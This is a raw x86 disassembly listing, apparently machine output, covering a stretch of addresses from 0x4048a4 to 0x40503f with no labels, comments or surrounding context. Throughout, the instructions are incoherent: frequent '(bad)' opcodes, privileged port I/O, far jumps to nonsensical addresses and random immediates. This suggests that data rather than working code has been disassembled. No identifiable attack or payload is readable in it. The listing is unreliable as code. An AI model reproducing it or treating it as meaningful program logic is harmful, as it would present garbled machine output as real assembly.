  4048a4:	adc    DWORD PTR [edi+eiz*8+0x18c4e3b9],ecx
  4048ab:	lods   eax,DWORD PTR ds:[esi]
  4048ac:	inc    edi
  4048ad:	loopne 0x40484b
  4048af:	div    DWORD PTR [esi]
  4048b1:	mov    cl,0xd0
  4048b3:	std    
  4048b4:	xchg   ecx,eax
  4048b5:	lock sub ebp,esi
  4048b8:	mov    ds:0x8e5df0cf,eax
  4048bd:	cmp    DWORD PTR [edx-0x2736313d],ebx
  4048c3:	cwde   
  4048c4:	pushf  
  4048c5:	pop    ebx
  4048c6:	daa    
  4048c7:	sbb    eax,0xf435c62f
  4048cc:	repz push eax
  4048ce:	pop    es
  4048cf:	retf   
  4048d0:	xor    ebp,DWORD PTR [edi+edx*2+0x37]
  4048d4:	out    dx,al
  4048d5:	scas   eax,DWORD PTR es:[edi]
  4048d6:	out    0x68,eax
  4048d8:	enter  0xecb7,0xaf
  4048dc:	test   dl,ch
  4048de:	cmp    al,0x25
  4048e0:	sub    eax,0x80288690
  4048e5:	mov    bl,0xed
  4048e7:	(bad)  
  4048e8:	or     ecx,DWORD PTR ds:0xeae2773e
  4048ee:	sbb    DWORD PTR [ecx+0x2160b08e],edi
  4048f4:	mov    ah,0xbd
  4048f6:	in     al,dx
  4048f7:	arpl   ax,cx
  4048f9:	cdq    
  4048fa:	xor    eax,0x6a0a1036
  4048ff:	je     0x404919
  404901:	ins    BYTE PTR es:[edi],dx
  404902:	sub    ah,ch
  404904:	mov    al,0xc5
  404906:	sbb    DWORD PTR [esi+eax*2],esi
  404909:	push   esp
  40490a:	sahf   
  40490b:	(bad)  
  40490c:	repz dec ecx
  40490e:	pop    eax
  40490f:	mov    DWORD PTR [ecx-0x55ed1f04],0xc0d87b8d
  404919:	mov    eax,0x8b8fb4ac
  40491e:	out    0x87,eax
  404920:	push   esi
  404921:	ins    BYTE PTR es:[edi],dx
  404922:	test   DWORD PTR [ecx+eax*2],esp
  404925:	inc    ebp
  404926:	rcr    DWORD PTR [edi-0x3bf295f6],0x87
  40492d:	mov    ebp,0x73c789c1
  404932:	dec    edx
  404933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404934:	ss scas eax,DWORD PTR es:[edi]
  404936:	shl    BYTE PTR [ebp+0x53f54888],cl
  40493c:	not    DWORD PTR [edx+ecx*1-0x6d3b96b7]
  404943:	or     BYTE PTR [edi],al
  404945:	shr    BYTE PTR [edx-0x5f],1
  404948:	sbb    esi,DWORD PTR [ebx+0x1da5b9ec]
  40494e:	push   ss
  40494f:	mov    cl,0xb0
  404951:	(bad)  
  404952:	fisubr DWORD PTR [eax+0x1c3fa198]
  404958:	jle    0x40490a
  40495a:	leave  
  40495b:	sar    BYTE PTR [esi-0x4c49e347],0x3b
  404962:	pop    edx
  404963:	loope  0x4049cd
  404965:	adc    BYTE PTR [eax],bl
  404967:	(bad)  
  404969:	pop    esp
  40496a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40496b:	sub    esi,esp
  40496d:	mov    ch,0x77
  40496f:	leave  
  404970:	nop
  404971:	lods   al,BYTE PTR ds:[esi]
  404972:	outs   dx,BYTE PTR ds:[esi]
  404973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404974:	int    0x17
  404976:	in     al,0x1e
  404978:	push   cs
  404979:	into   
  40497a:	inc    ebx
  40497b:	mov    al,0x3d
  40497d:	sbb    BYTE PTR [ebx+ecx*2+0x2008aa18],0x53
  404985:	mov    edi,0x7af50aeb
  40498a:	mov    ecx,0x7fdb2f77
  40498f:	mov    cl,0x20
  404991:	pop    ss
  404992:	or     al,0x5
  404994:	shr    DWORD PTR [eax-0x69],0x58
  404998:	or     al,0x26
  40499a:	into   
  40499b:	ins    DWORD PTR es:[edi],dx
  40499c:	or     al,0x5a
  40499e:	push   ebx
  40499f:	mov    bl,BYTE PTR [esi]
  4049a1:	inc    esi
  4049a2:	(bad)
  4049a5:	adc    eax,0xf3abbfbd
  4049aa:	rcl    BYTE PTR [ecx+0x31],1
  4049ad:	sbb    eax,0xc631f75c
  4049b2:	jmp    0x9ecaa107
  4049b7:	dec    ebp
  4049b8:	dec    ecx
  4049b9:	jg     0x404a3a
  4049bb:	leave  
  4049bc:	inc    edx
  4049bd:	cmp    DWORD PTR [eax+eax*4+0x188ae58d],esi
  4049c4:	scas   al,BYTE PTR es:[edi]
  4049c5:	pop    es
  4049c6:	cld    
  4049c7:	lock xor al,0x63
  4049ca:	loopne 0x404969
  4049cc:	sbb    BYTE PTR [ecx+0x52],cl
  4049cf:	in     al,0x2
  4049d1:	out    dx,eax
  4049d2:	retf   0x3cbf
  4049d5:	or     edx,DWORD PTR [ebx]
  4049d7:	sar    BYTE PTR [edi],cl
  4049d9:	loope  0x4049be
  4049db:	scas   al,BYTE PTR es:[edi]
  4049dc:	or     eax,0x6977d8ea
  4049e1:	jns    0x404a37
  4049e3:	sbb    edx,DWORD PTR [edi+0xb]
  4049e6:	lock mov ebp,ebx
  4049e9:	pop    eax
  4049ea:	jmp    0x7535be22
  4049ef:	dec    ecx
  4049f0:	or     ecx,DWORD PTR [esi-0x66e2f7bd]
  4049f6:	jno    0x404996
  4049f8:	pushf  
  4049f9:	mov    bl,0x5
  4049fb:	out    dx,al
  4049fc:	outs   dx,BYTE PTR ds:[esi]
  4049fd:	cmp    BYTE PTR [eax-0x507e7fcf],ch
  404a03:	mov    ecx,0x49cb7c5b
  404a08:	jb     0x404a00
  404a0a:	stos   BYTE PTR es:[edi],al
  404a0b:	jno    0x4049c6
  404a0d:	xor    DWORD PTR [edi-0x52],esp
  404a10:	ret    
  404a11:	push   ecx
  404a12:	jmp    0x404a20
  404a14:	(bad)  
  404a15:	cmp    eax,0xa5a0c6ba
  404a1a:	adc    ah,ch
  404a1c:	dec    ebp
  404a1d:	in     al,dx
  404a1e:	adc    edx,DWORD PTR [edi+0x1cea8769]
  404a24:	or     al,0x7e
  404a26:	into   
  404a27:	sar    al,0x4d
  404a2a:	sbb    al,0xd5
  404a2c:	aad    0x2f
  404a2e:	and    edx,DWORD PTR [edi]
  404a30:	jge    0x404a2a
  404a32:	loope  0x4049f9
  404a34:	jbe    0x404a4d
  404a36:	loopne 0x404a1d
  404a38:	(bad)  
  404a39:	sbb    ch,dl
  404a3b:	out    dx,eax
  404a3c:	xor    BYTE PTR ds:0x7823a10d,ah
  404a42:	jecxz  0x404a50
  404a44:	cmp    eax,0x748f6dfd
  404a49:	cmp    ch,BYTE PTR [edx+0x64]
  404a4c:	scas   eax,DWORD PTR es:[edi]
  404a4d:	sbb    al,BYTE PTR [ecx+0x751b41e8]
  404a53:	mov    ?,WORD PTR [ebx-0x79]
  404a56:	mov    ecx,0xed1764ad
  404a5b:	outs   dx,DWORD PTR ds:[esi]
  404a5c:	fld    QWORD PTR [edx+ebp*1]
  404a5f:	fidivr WORD PTR [ebx]
  404a61:	loopne 0x404a3d
  404a63:	mov    DWORD PTR [ecx],0x1bdf1a29
  404a69:	in     eax,dx
  404a6a:	sub    BYTE PTR es:[eax+esi*1+0x1f],dh
  404a6f:	jg     0x404a4d
  404a71:	iret   
  404a72:	or     bh,BYTE PTR [edx-0x107ef963]
  404a78:	sub    al,0x45
  404a7a:	fiadd  WORD PTR [edx+0x72]
  404a7d:	div    DWORD PTR [esi-0x34]
  404a80:	nop
  404a81:	inc    eax
  404a82:	push   ecx
  404a83:	inc    ecx
  404a84:	xor    BYTE PTR [eax+0x78],bh
  404a87:	jp     0x404a5a
  404a89:	jg     0x404aea
  404a8b:	cmp    BYTE PTR [eax+0x488edb25],0x66
  404a92:	lods   eax,DWORD PTR ds:[esi]
  404a93:	and    eax,0xb905bcf9
  404a98:	push   esi
  404a99:	(bad)  
  404a9a:	mov    al,BYTE PTR [esi-0x38]
  404a9d:	mov    al,ds:0xd3a5ef47
  404aa2:	dec    ebx
  404aa3:	outs   dx,BYTE PTR ds:[esi]
  404aa4:	clc    
  404aa5:	sub    ebp,0xa8812c17
  404aab:	mov    ecx,0xf83542e7
  404ab0:	add    DWORD PTR [ebx],edi
  404ab2:	repz (bad) 
  404ab4:	popa   
  404ab5:	adc    ch,BYTE PTR [eax-0x3f]
  404ab8:	paddq  mm1,QWORD PTR [ebx+ebp*4]
  404abc:	popf   
  404abd:	out    0x60,eax
  404abf:	or     eax,DWORD PTR [edx-0x79]
  404ac2:	retf   
  404ac3:	outs   dx,DWORD PTR ds:[esi]
  404ac4:	mov    dl,0xf3
  404ac6:	inc    esi
  404ac7:	(bad)  
  404ac8:	ins    BYTE PTR es:[edi],dx
  404ac9:	add    BYTE PTR [ecx],0x74
  404acc:	scas   al,BYTE PTR es:[edi]
  404acd:	add    al,0x40
  404acf:	fs imul edx,ecx,0x59
  404ad3:	or     BYTE PTR [esi+0x4ba7bc37],ch
  404ad9:	fwait
  404ada:	int3   
  404adb:	pop    ebx
  404adc:	fstp   DWORD PTR [edx-0x28c1d1cd]
  404ae2:	or     al,0x7b
  404ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ae5:	cs call 0x7d92c3c3
  404aeb:	push   ebx
  404aec:	imul   ebp,DWORD PTR [edi+0x76],0x63
  404af0:	dec    ecx
  404af1:	lods   al,BYTE PTR ds:[esi]
  404af2:	mov    ch,0x5
  404af4:	push   0x6a031965
  404af9:	gs jbe 0x404b6e
  404afc:	retf   0xc836
  404aff:	push   ebx
  404b00:	aad    0x80
  404b02:	mov    ah,0xb5
  404b04:	or     BYTE PTR [ecx+0x7edf8ca4],dl
  404b0a:	pop    ss
  404b0b:	int3   
  404b0c:	rcr    dh,1
  404b0e:	sub    DWORD PTR [esi+0x2089e8a3],0x636fe52
  404b18:	xchg   ebx,eax
  404b19:	xchg   edx,eax
  404b1a:	inc    DWORD PTR [edx-0x73]
  404b1d:	ds in  eax,dx
  404b1f:	rcl    DWORD PTR [edx-0x67590b7c],cl
  404b25:	jmp    0x7c593125
  404b2a:	nop
  404b2b:	(bad)  
  404b2c:	clc    
  404b2d:	dec    BYTE PTR [eax]
  404b2f:	or     ebp,DWORD PTR [esp+esi*4+0x36]
  404b33:	and    DWORD PTR [ebx],ebx
  404b35:	(bad)  
  404b37:	in     al,dx
  404b38:	adc    eax,0xde2c9c98
  404b3d:	(bad)  [edi+0x25]
  404b40:	jne    0x404b23
  404b42:	push   eax
  404b43:	repz dec eax
  404b45:	arpl   si,si
  404b47:	in     eax,dx
  404b48:	repz test BYTE PTR [edi-0x64c724c0],0x60
  404b50:	aas    
  404b51:	call   0xdaac:0x2ddcae23
  404b58:	dec    eax
  404b59:	icebp  
  404b5a:	xchg   ebp,eax
  404b5b:	xchg   esi,edx
  404b5d:	test   DWORD PTR [esi-0x5442a16e],ebx
  404b63:	mov    db0,eax
  404b66:	push   0x30
  404b68:	xchg   esp,eax
  404b69:	sub    eax,0xc744a2a0
  404b6e:	in     al,0x9a
  404b70:	adc    al,0x4f
  404b72:	adc    ecx,esi
  404b74:	mov    bh,0xc3
  404b76:	cmp    esi,edi
  404b78:	mov    bh,0xff
  404b7a:	fnstsw WORD PTR [esi-0x48b3d6fa]
  404b80:	in     al,dx
  404b81:	retf   
  404b82:	in     eax,dx
  404b83:	mov    WORD PTR [ecx],gs
  404b85:	pop    ecx
  404b86:	shr    esi,0x41
  404b89:	xchg   ecx,eax
  404b8a:	jl     0x404b9a
  404b8c:	loope  0x404c08
  404b8e:	stos   BYTE PTR es:[edi],al
  404b8f:	iret   
  404b90:	(bad)  
  404b91:	jg     0x404b3a
  404b93:	outs   dx,DWORD PTR ds:[esi]
  404b94:	popf   
  404b95:	mov    ebx,0x23edd1d0
  404b9a:	aaa    
  404b9b:	fsub   QWORD PTR [ecx-0xa]
  404b9e:	mov    bl,0x39
  404ba0:	sub    al,0xe
  404ba2:	rcr    bl,1
  404ba4:	popf   
  404ba5:	shl    BYTE PTR [edi+ecx*8+0x3d157ae8],cl
  404bac:	mov    eax,DWORD PTR [ecx+0x5129c65a]
  404bb2:	call   0xbf9ae410
  404bb7:	das    
  404bb8:	push   ebp
  404bb9:	and    al,0xc3
  404bbb:	cmc    
  404bbc:	mov    esi,0x89cf0c5f
  404bc1:	das    
  404bc2:	pop    ecx
  404bc3:	jmp    0x404c31
  404bc5:	loop   0x404b68
  404bc7:	pop    esi
  404bc8:	xchg   DWORD PTR [edx],eax
  404bca:	xor    BYTE PTR [edx-0x1fd93e9c],ch
  404bd0:	aas    
  404bd1:	int    0xe5
  404bd3:	xor    BYTE PTR [ebx-0x43476c5c],al
  404bd9:	bound  esp,QWORD PTR [ecx]
  404bdb:	cmp    al,0x1f
  404bdd:	rcr    ebx,1
  404bdf:	mov    BYTE PTR [ecx+ebp*4],ch
  404be2:	loope  0x404b66
  404be4:	call   0xef1dba58
  404be9:	or     DWORD PTR [edx+ebx*2],ecx
  404bec:	imul   ebp,DWORD PTR [ecx+0x29],0xa1e54cfc
  404bf3:	iret   
  404bf4:	in     eax,dx
  404bf5:	or     BYTE PTR [edi+0x5d9c9d],al
  404bfb:	push   esp
  404bfc:	lock ins DWORD PTR es:[edi],dx
  404bfe:	xchg   edx,eax
  404bff:	cmp    DWORD PTR [esi+0x3d892b7],esi
  404c05:	add    ebp,ebx
  404c07:	xor    DWORD PTR [edi],0xffffff8e
  404c0a:	sbb    al,0x75
  404c0c:	and    al,0xbd
  404c0e:	sahf   
  404c0f:	push   ss
  404c10:	push   edi
  404c11:	and    BYTE PTR [ebp-0x76],0xfc
  404c15:	inc    edi
  404c16:	je     0x404b9f
  404c18:	bswap  esp
  404c1a:	adc    al,0x73
  404c1c:	dec    edx
  404c1d:	mov    ds:0x7f79c1df,eax
  404c22:	aas    
  404c23:	mov    DWORD PTR [edi-0x3ef48e71],esi
  404c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c2a:	mov    bl,0xd4
  404c2c:	aas    
  404c2d:	inc    edi
  404c2e:	gs inc edi
  404c30:	xor    cl,0x1e
  404c33:	cmp    al,0x4d
  404c35:	jle    0x404bfb
  404c37:	jp     0x404c68
  404c39:	(bad)  
  404c3a:	adc    ebp,DWORD PTR [eax+0xe]
  404c3d:	mov    dh,BYTE PTR [esi+0x45]
  404c40:	sti    
  404c41:	in     eax,dx
  404c42:	lods   eax,DWORD PTR ds:[esi]
  404c43:	and    ebx,DWORD PTR [ebx]
  404c45:	outs   dx,DWORD PTR ds:[esi]
  404c46:	or     BYTE PTR [eax-0x2c],cl
  404c49:	push   esp
  404c4a:	pop    es
  404c4b:	stc    
  404c4c:	jb     0x404bec
  404c4e:	xor    DWORD PTR [ebx-0x23],ebp
  404c51:	or     al,0x6d
  404c53:	pop    esi
  404c54:	jge    0x404c92
  404c56:	push   edi
  404c57:	jno    0x404c71
  404c59:	adc    bh,BYTE PTR [ecx-0x80]
  404c5c:	push   esi
  404c5d:	pushf  
  404c5e:	rcl    BYTE PTR [edi+0x31e4fa6d],0x97
  404c65:	push   edx
  404c66:	or     bl,BYTE PTR [ebx-0x7]
  404c69:	cwde   
  404c6a:	dec    edx
  404c6b:	cmp    eax,DWORD PTR [edi+edi*2+0x3]
  404c6f:	jo     0x404ce7
  404c71:	cwde   
  404c72:	(bad)  
  404c73:	leave  
  404c74:	arpl   WORD PTR [edx-0x28],bp
  404c77:	int    0x8a
  404c79:	xor    ax,0x5001
  404c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c7e:	push   esp
  404c7f:	sbb    DWORD PTR [edi],edx
  404c81:	imul   dx,WORD PTR [ebx+0x5db44ff9],0xd82e
  404c8a:	or     al,0x83
  404c8c:	inc    edi
  404c8d:	and    cl,BYTE PTR [ebx-0x29f267ae]
  404c93:	lea    edx,[edi-0x16]
  404c96:	nop
  404c97:	push   ecx
  404c98:	cs push 0x53
  404c9b:	adc    ch,BYTE PTR [eiz*2-0x2e4fd80e]
  404ca2:	pusha  
  404ca3:	out    dx,al
  404ca4:	xor    BYTE PTR [edx+edi*2+0x4b],0x4b
  404ca9:	or     DWORD PTR [esi-0x3f4e23b8],esp
  404caf:	xor    bl,dl
  404cb1:	jbe    0x404c98
  404cb3:	add    BYTE PTR [edi+esi*4+0x6d],bh
  404cb7:	in     al,dx
  404cb8:	push   es
  404cb9:	inc    ecx
  404cba:	sub    dl,BYTE PTR [ebx-0x44f7b3f8]
  404cc0:	pop    edi
  404cc1:	imul   edx,DWORD PTR [edx-0x330c7c9e],0xffffffb4
  404cc8:	mov    bl,0xa5
  404cca:	cmp    al,0xb6
  404ccc:	dec    bl
  404cce:	mov    bh,BYTE PTR [ebp+0x52]
  404cd1:	icebp  
  404cd2:	hlt    
  404cd3:	gs dec eax
  404cd5:	adc    al,0x7e
  404cd7:	iret   
  404cd8:	push   DWORD PTR [esi-0x6ab93ef4]
  404cde:	leave  
  404cdf:	cmc    
  404ce0:	in     eax,dx
  404ce1:	sbb    BYTE PTR [ecx-0x3c],cl
  404ce4:	push   ds
  404ce5:	mov    al,0x8a
  404ce7:	fisubr DWORD PTR [edx-0x404c0e0d]
  404ced:	xor    edi,DWORD PTR [ebx]
  404cef:	leave  
  404cf0:	sbb    BYTE PTR [ecx],cl
  404cf2:	cld    
  404cf3:	pop    eax
  404cf4:	ds sbb ebp,ecx
  404cf7:	daa    
  404cf8:	push   ss
  404cf9:	xchg   edx,eax
  404cfa:	fist   WORD PTR [ecx-0x4e]
  404cfd:	or     eax,0xc85326dd
  404d02:	in     al,0x75
  404d04:	icebp  
  404d05:	inc    esi
  404d06:	and    eax,0xe4157b0e
  404d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d0c:	shr    BYTE PTR [ebp+0x52a8b5e3],0x67
  404d13:	inc    edx
  404d14:	dec    ecx
  404d15:	fucom  st(6)
  404d17:	cmp    ebp,DWORD PTR [edx]
  404d19:	mov    al,ds:0xed53973f
  404d1e:	repz push cs
  404d20:	in     eax,dx
  404d21:	aaa    
  404d22:	adc    al,0x6a
  404d24:	jmp    0x404d1a
  404d26:	div    BYTE PTR [edx+0x70]
  404d29:	lods   eax,DWORD PTR ds:[esi]
  404d2a:	sbb    dl,0xaf
  404d2d:	aas    
  404d2e:	pop    edi
  404d2f:	xchg   edx,eax
  404d30:	pop    esp
  404d31:	loopne 0x404d1a
  404d33:	push   ebp
  404d34:	mov    esp,ss
  404d36:	fstp   TBYTE PTR [edi]
  404d38:	sub    eax,0x7067fa77
  404d3d:	(bad)  
  404d3e:	int3   
  404d3f:	mov    ecx,0x341f65e3
  404d44:	cmp    dh,dh
  404d46:	test   eax,0x762298d3
  404d4b:	ds pop ebp
  404d4d:	pop    ds
  404d4e:	ds icebp 
  404d50:	loop   0x404d30
  404d52:	fwait
  404d53:	ins    DWORD PTR es:[edi],dx
  404d54:	push   es
  404d55:	retf   
  404d56:	mov    cl,0x7c
  404d58:	fcom   st(2)
  404d5a:	fiadd  WORD PTR [edx+0x59b40cfe]
  404d60:	push   cs
  404d61:	cs fs daa 
  404d64:	cmp    al,0xcc
  404d66:	mov    ah,BYTE PTR [edx+0x24]
  404d69:	pop    edx
  404d6a:	bound  edx,QWORD PTR [edi-0x72]
  404d6d:	addr16 repz pushw 0x20
  404d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d73:	sub    ch,BYTE PTR [edi-0x27445770]
  404d79:	inc    ecx
  404d7a:	test   eax,0x19efe317
  404d7f:	mov    cl,ch
  404d81:	jmp    0x5037e7a5
  404d86:	arpl   WORD PTR [eax],sp
  404d88:	lahf   
  404d89:	call   ebx
  404d8b:	jg     0x404d51
  404d8d:	dec    esi
  404d8e:	sar    DWORD PTR [edi-0x1108feaf],1
  404d94:	stc    
  404d95:	sbb    al,0x24
  404d97:	je     0x404df3
  404d99:	in     al,dx
  404d9a:	(bad)  
  404d9b:	fcomi  st,st(5)
  404d9d:	cmp    eax,0x651e53b0
  404da2:	mov    ds:0x3984cfe2,al
  404da7:	lea    ecx,[ebx]
  404da9:	mov    bh,BYTE PTR [edi+0x3]
  404dac:	lds    ecx,FWORD PTR [ecx+eiz*1-0x45]
  404db0:	mov    bl,0xd4
  404db2:	pop    edi
  404db3:	pusha  
  404db4:	pop    esi
  404db5:	push   cs
  404db6:	push   0xffffffda
  404db8:	inc    eax
  404db9:	lods   al,BYTE PTR ds:[esi]
  404dba:	(bad)  
  404dbb:	mov    edx,0xd28255a2
  404dc0:	gs enter 0x6623,0x25
  404dc5:	dec    edx
  404dc6:	xor    ah,BYTE PTR ds:0x839de4bc
  404dcc:	call   FWORD PTR [esi+0x70c9b9df]
  404dd2:	in     eax,dx
  404dd3:	xor    DWORD PTR ds:[edi-0xa],edx
  404dd7:	and    eax,0x44ce049e
  404ddc:	loope  0x404e2d
  404dde:	push   ebp
  404ddf:	cmp    eax,0x82140fea
  404de4:	mov    edi,0x7c9375d4
  404de9:	out    dx,al
  404dea:	sbb    DWORD PTR [edi+0x22],ebp
  404ded:	mov    gs,edx
  404def:	jmp    0xa1d5:0x18de3375
  404df6:	shl    DWORD PTR [ecx+0x6124f638],1
  404dfc:	mov    al,0xaf
  404dfe:	pop    ecx
  404dff:	xchg   DWORD PTR [esp+esi*8-0x29f871f0],ecx
  404e06:	and    ecx,eax
  404e08:	push   0xffffff97
  404e0a:	dec    eax
  404e0b:	sahf   
  404e0c:	push   esi
  404e0d:	test   eax,0xb91c22e8
  404e12:	mov    bh,BYTE PTR [eax-0xf]
  404e15:	adc    DWORD PTR [ebp-0x789f4f20],esp
  404e1b:	fsubr  st(1),st
  404e1d:	fidivr WORD PTR [esi+0x3d9cf3be]
  404e23:	int3   
  404e24:	dec    esp
  404e25:	in     eax,dx
  404e26:	inc    eax
  404e27:	aas    
  404e28:	jns    0x404e0e
  404e2a:	rol    bl,1
  404e2c:	mov    dl,0xda
  404e2e:	jge    0x404ea9
  404e30:	pop    ebx
  404e31:	sub    bl,BYTE PTR [ebx-0x9ec7495]
  404e37:	cld    
  404e38:	into   
  404e39:	mov    edi,0xb561e3e6
  404e3e:	stos   DWORD PTR es:[edi],eax
  404e3f:	push   esi
  404e40:	jge    0x404e8b
  404e42:	jnp    0x404e36
  404e44:	sti    
  404e45:	or     ch,BYTE PTR [ebx-0x77]
  404e48:	adc    ecx,0x39b65604
  404e4e:	sub    eax,0xd3547a46
  404e53:	out    0x75,eax
  404e55:	xor    esp,edi
  404e57:	cdq    
  404e58:	mov    edi,0x8d930036
  404e5d:	sar    cl,1
  404e5f:	test   al,0xc2
  404e61:	das    
  404e62:	xor    DWORD PTR [eax],esp
  404e64:	mov    dh,0x86
  404e66:	repz sbb al,0x43
  404e69:	xor    bh,BYTE PTR [ecx]
  404e6b:	add    DWORD PTR [ecx-0x67ca72a2],esi
  404e71:	(bad)
  404e74:	push   es
  404e75:	loop   0x404eb9
  404e77:	pop    eax
  404e78:	push   esi
  404e79:	pop    ebx
  404e7a:	push   ebp
  404e7b:	mov    dh,BYTE PTR [ecx]
  404e7d:	and    cl,bl
  404e7f:	ja     0x404edb
  404e81:	or     edx,DWORD PTR [ebx]
  404e83:	imul   eax,DWORD PTR ds:0x920eef3,0x42
  404e8a:	adc    eax,0x18a0f777
  404e8f:	(bad)  
  404e90:	cld    
  404e91:	add    al,0xda
  404e93:	jbe    0x404eb1
  404e95:	sbb    BYTE PTR [esi-0x11f40232],ch
  404e9b:	push   esi
  404e9c:	lds    edx,FWORD PTR [edi+edx*2]
  404e9f:	adc    DWORD PTR [edi],0xb6739973
  404ea5:	xor    ch,BYTE PTR [eax-0x2cbc2fbd]
  404eab:	shl    DWORD PTR [edi-0x103be7b4],cl
  404eb1:	inc    ecx
  404eb2:	fsub   DWORD PTR [ecx+0x40]
  404eb5:	scas   al,BYTE PTR es:[edi]
  404eb6:	mov    edx,0x6cdde2b7
  404ebb:	cmc    
  404ebc:	cmc    
  404ebd:	arpl   di,si
  404ebf:	dec    esp
  404ec0:	xor    cl,BYTE PTR [ebx+0x60]
  404ec3:	push   es
  404ec4:	pop    es
  404ec5:	push   edx
  404ec6:	add    al,0x34
  404ec8:	fs xchg ecx,eax
  404eca:	popa   
  404ecb:	xor    cl,BYTE PTR [ebx+0x7a]
  404ece:	mul    DWORD PTR [edx]
  404ed0:	mov    al,ds:0xd5dff66d
  404ed5:	xchg   ebx,eax
  404ed6:	push   edi
  404ed7:	in     al,dx
  404ed8:	cld    
  404ed9:	inc    edi
  404eda:	push   esp
  404edb:	xor    esp,ebx
  404edd:	popa   
  404ede:	(bad)  
  404edf:	jne    0x404eff
  404ee1:	ret    
  404ee2:	xor    al,0x33
  404ee4:	shl    DWORD PTR [ebp+0x330d951c],cl
  404eea:	div    DWORD PTR [esp+eiz*4-0x27400aaa]
  404ef1:	in     al,dx
  404ef2:	inc    eax
  404ef3:	cdq    
  404ef4:	into   
  404ef5:	es out 0xfa,al
  404ef8:	push   ds
  404ef9:	push   ss
  404efa:	stos   DWORD PTR es:[edi],eax
  404efb:	sbb    ebx,DWORD PTR [eax+0x7587268d]
  404f01:	jns    0x404e91
  404f03:	jae    0x404f50
  404f05:	js     0x404f3d
  404f07:	imul   ebp,esi,0x2b
  404f0a:	pop    esp
  404f0b:	fild   DWORD PTR [eax]
  404f0d:	psubq  mm4,QWORD PTR [esp+edx*8-0x72499d45]
  404f15:	inc    esi
  404f16:	mov    ah,0x4a
  404f18:	movq   QWORD PTR [ebp-0x7f],mm7
  404f1c:	inc    edx
  404f1d:	push   edx
  404f1e:	jp     0x404ed4
  404f20:	jo     0x404f50
  404f22:	sbb    ebp,DWORD PTR [ebp-0x1733bcd6]
  404f28:	dec    edx
  404f29:	sub    eax,0x17759b39
  404f2e:	dec    edi
  404f2f:	loopne 0x404f2b
  404f31:	mov    eax,0xf4e31d40
  404f36:	adc    edx,edx
  404f38:	mov    eax,es:0x2f2ee73d
  404f3e:	jp     0x404f16
  404f40:	rcl    DWORD PTR [edx+eiz*4],1
  404f43:	loop   0x404ed9
  404f45:	inc    edx
  404f46:	lds    ebp,FWORD PTR [edx]
  404f48:	ret    0x7c10
  404f4b:	mov    DWORD PTR [edx],edi
  404f4d:	ins    BYTE PTR es:[edi],dx
  404f4e:	rcl    BYTE PTR [ecx+0x57c63ce0],cl
  404f54:	loopne 0x404f38
  404f56:	popa   
  404f57:	ins    BYTE PTR es:[edi],dx
  404f58:	cmp    esp,DWORD PTR [ecx]
  404f5a:	add    eax,0x1b80f8a7
  404f5f:	sub    cl,BYTE PTR [esi]
  404f61:	mov    ds:0x61d7f943,eax
  404f66:	aas    
  404f67:	dec    esi
  404f68:	int3   
  404f69:	mov    al,0x7e
  404f6b:	clc    
  404f6c:	jbe    0x404f6d
  404f6e:	std    
  404f6f:	xlat   BYTE PTR ds:[ebx]
  404f70:	(bad)  
  404f72:	dec    ebp
  404f73:	inc    DWORD PTR [esi+0x6363f468]
  404f79:	les    esi,FWORD PTR [eax]
  404f7b:	out    dx,al
  404f7c:	out    dx,eax
  404f7d:	iret   
  404f7e:	mov    dh,0x5b
  404f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f81:	and    edi,DWORD PTR [eax+0x6c845e07]
  404f87:	mov    bh,0x13
  404f89:	addr16 inc edi
  404f8b:	in     al,0x7b
  404f8d:	fwait
  404f8e:	push   ss
  404f8f:	xchg   edi,eax
  404f90:	icebp  
  404f91:	sbb    al,0x18
  404f93:	mov    DWORD PTR [esi+0x7c],ebx
  404f96:	sti    
  404f97:	jnp    0x404fbb
  404f99:	lock clc 
  404f9b:	dec    esi
  404f9c:	outs   dx,BYTE PTR ds:[esi]
  404f9d:	fsubr  DWORD PTR [ebx+0x20]
  404fa0:	fistp  QWORD PTR [ecx+ebp*2+0x6]
  404fa4:	mov    esp,0x63902363
  404fa9:	mov    dl,0x5d
  404fab:	and    DWORD PTR ds:0x70745594,edx
  404fb1:	out    0xd5,al
  404fb3:	dec    edi
  404fb4:	es xchg edx,eax
  404fb6:	mov    ch,0xf9
  404fb8:	repz jns 0x404f7d
  404fbb:	inc    edi
  404fbc:	in     al,0xf7
  404fbe:	out    dx,eax
  404fbf:	xor    al,0x27
  404fc1:	loope  0x40501c
  404fc3:	sbb    BYTE PTR [ecx-0x6],cl
  404fc6:	jmp    0x4e63:0xeb5adbb7
  404fcd:	std    
  404fce:	mov    edi,DWORD PTR [ebp-0xa53f7c2]
  404fd4:	rol    BYTE PTR [ebp+0x20a96ae5],1
  404fda:	add    eax,DWORD PTR ds:0xc3bfc39d
  404fe0:	in     eax,0x1
  404fe2:	in     al,dx
  404fe3:	fptan  
  404fe5:	cmp    ch,BYTE PTR [ecx-0x6f]
  404fe8:	add    eax,0x63794916
  404fed:	pop    ebp
  404fee:	gs and al,0x12
  404ff1:	lea    ebx,[ebx-0x3c92a3fe]
  404ff7:	in     al,dx
  404ff8:	lahf   
  404ff9:	dec    ebp
  404ffa:	jo     0x404f86
  404ffc:	xchg   edi,eax
  404ffd:	add    eax,0x8beb02bf
  405002:	das    
  405003:	dec    ecx
  405004:	cmp    DWORD PTR [esi+edx*2+0x5bd25380],edi
  40500b:	daa    
  40500c:	cmp    al,0x1d
  40500e:	test   DWORD PTR ss:[ebx+0x78],ebp
  405012:	mov    ds:0x9adcc9e7,al
  405017:	push   ss
  405018:	push   0x64c4193e
  40501d:	inc    eax
  40501e:	int3   
  40501f:	shl    ebp,1
  405021:	shl    BYTE PTR [ebp-0x236b5aa9],1
  405027:	enter  0xe957,0x67
  40502b:	call   0x8664f742
  405030:	enter  0xdd07,0xd5
  405034:	sbb    al,0x4d
  405036:	je     0x405040
  405038:	and    al,0xf1
  40503a:	and    al,0x5b
  40503c:	cmc    
  40503d:	outs   dx,DWORD PTR ds:[esi]
  40503e:	into   
  40503f:	fwait
